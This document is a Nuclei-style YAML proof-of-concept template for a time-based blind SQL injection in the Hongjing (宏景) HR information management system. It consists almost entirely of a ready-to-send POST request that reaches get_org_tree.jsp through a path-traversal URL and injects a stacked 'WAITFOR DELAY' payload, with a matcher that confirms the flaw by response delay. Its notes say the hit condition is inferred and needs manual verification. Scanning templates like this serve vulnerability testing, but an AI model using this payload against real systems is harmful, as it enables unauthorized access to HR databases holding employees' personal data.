id: poc-561a4685f43cdebd4589
info:
  name: 宏景人力资源信息管理系统get_org_tree存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2025
http:
- raw:
  - 'POST /templates/attestation/../../kq/app_check_in/get_org_tree.jsp HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36

    Content-Length: 34

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9

    Cache-Control: max-age=0

    Connection: close

    Content-Type: application/x-www-form-urlencoded

    Cookie: JSESSIONID=E343A5DB5A1B3069FE78F2525E8FB871

    Upgrade-Insecure-Requests: 1


    params=1=0;WAITFOR DELAY ''0:0:5''--'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
